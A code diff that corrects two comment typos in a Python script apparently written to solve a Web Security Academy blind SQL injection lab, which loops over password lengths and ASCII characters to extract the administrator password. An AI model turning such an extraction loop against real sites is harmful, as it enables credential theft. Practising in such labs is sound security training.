@@ -28,7 +28,7 @@ import sys
 lab_id = '0aea002a03f7d7fbcaaa159a00950015' #change based on generated lab page id
 base_uri = f"https://{lab_id}.web-security-academy.net/" # contains the vulnerable sqli path
 length_check  = [x for x in range(0,101)] # password length iterator that goes up to 100
-ascii_chart = [char for char in range(32,127)] # ascii character iterator that includes alphanumeric characters (in decmal format)
+ascii_chart = [char for char in range(32,127)] # ascii character iterator that includes alphanumeric characters (in decimal format)
 
 
 def get_password_length(num: int) -> int:
@@ -86,7 +86,7 @@ def main() -> None:
         print("[-] Could not find password length. Check sqli query. Exiting.")
         sys.exit(-1)
     
-    # use the length of the adminstrator password to retrieve the password
+    # use the length of the administrator password to retrieve the password
     password = ''
     for i in range(1,password_length):
         password_funct = functools.partial(get_password, i)
